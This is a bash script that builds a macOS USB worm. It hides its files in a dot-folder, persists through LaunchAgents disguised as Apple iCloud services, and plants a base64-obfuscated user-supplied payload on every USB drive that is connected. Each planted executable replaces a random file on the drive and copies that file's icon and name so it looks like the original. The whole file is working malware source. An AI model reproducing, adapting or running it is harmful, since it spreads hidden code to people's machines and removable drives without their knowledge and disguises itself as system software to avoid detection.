#!/bin/bash
read -p "Path of your shell script : " path
DIR=$(dirname $0)
echo
echo "Script has been created at : $DIR/inject.sh"
cat <<'EOM' >$DIR/inject.sh
#!/bin/bash
DIR=$(dirname $0)
mkdir /Users/$(whoami)/Library/Containers/.injector
cp $DIR/injector.sh /Users/$(whoami)/Library/Containers/.injector/payload.sh
echo "echo $(cat /Users/$(whoami)/Library/Containers/.injector/payload.sh|base64) | base64 -D | bash &" > /Users/$(whoami)/Library/Containers/.injector/payload.sh
cat <<'EOP' >/Users/$(whoami)/Library/Containers/.injector/injector.sh
#!/bin/bash
DIR=$(dirname $0)
var=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l )

if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -eq 1 ]]; then
echo "USB Connected"
    name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
	random=$(find  $name -not -path '*/\.*' -type f | python -c "import sys; import random; print(random.choice(sys.stdin.readlines()).rstrip())"); new=$(rev <<< "$random" | cut -d"." -f2- | rev)
	cat <<EOZ >"$new"
$(cat /Users/$(whoami)/Library/Containers/.injector/payload.sh)
EOZ
chmod +x "$new"
python $DIR/seticon.py "$random" "$new"
mv "$new" "$new. $(echo $random|awk -F . '{if (NF>1) {print $NF}}')"   
    echo "Injector Finished"
fi


while true; do 
if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -gt $var ]]; then
	echo "USB Connected"
    name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
	random=$(find  $name -not -path '*/\.*' -type f | python -c "import sys; import random; print(random.choice(sys.stdin.readlines()).rstrip())"); new=$(rev <<< "$random" | cut -d"." -f2- | rev)
	cat <<EOT >"$new"
$(cat /Users/$(whoami)/Library/Containers/.injector/payload.sh)
EOT
chmod +x "$new"
python $DIR/seticon.py "$random" "$new"
mv "$new" "$new. $(echo $random|awk -F . '{if (NF>1) {print $NF}}')"
    echo "Injector Finished"
	((var+=1))
elif [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -lt $var ]]; then
	echo "USB Disconnected"
	((var-=1))
fi
done
EOP
cat <<EOQ >~/Library/LaunchAgents/com.apple.icloud.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.icloud</string>
	<key>Program</key>
	<string>/Users/$(whoami)/Library/Containers/.injector/injector.sh</string>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
EOQ
cat <<EOO >~/Library/LaunchAgents/com.apple.icloudd.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.icloudd</string>
	<key>Program</key>
	<string>/Users/$(whoami)/Library/Containers/.injector/script.sh</string>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
EOO
chmod +x /Users/$(whoami)/Library/Containers/.injector/injector.sh
cat <<'EOA' >/Users/$(whoami)/Library/Containers/.injector/seticon.py
#!/usr/bin/env python
import Cocoa
import sys

Cocoa.NSWorkspace.sharedWorkspace().setIcon_forFile_options_(Cocoa.NSImage.alloc().initWithContentsOfFile_(sys.argv[1].decode('utf-8')), sys.argv[2].decode('utf-8'), 0) or sys.exit("Unable to set file icon")
EOA
launchctl load -w ~/Library/LaunchAgents/com.apple.icloud.plist
cat <<EOX > /Users/$(whoami)/Library/Containers/.injector/script.sh
#!/bin/bash
echo "$(cat $path | base64) | base64 -D | bash & 
EOX
EOM
echo 'cat <<EOX > /Users/$(whoami)/Library/Containers/.injector/script.sh' >> $DIR/inject.sh
echo '#!/bin/bash' >> $DIR/inject.sh
echo "echo $(cat $path | base64) | base64 -D | bash &" >> $DIR/inject.sh
echo "EOX" >> $DIR/inject.sh
echo "sh /Users/$(whoami)/Library/Containers/.injector/injector.sh" >> $DIR/inject.sh
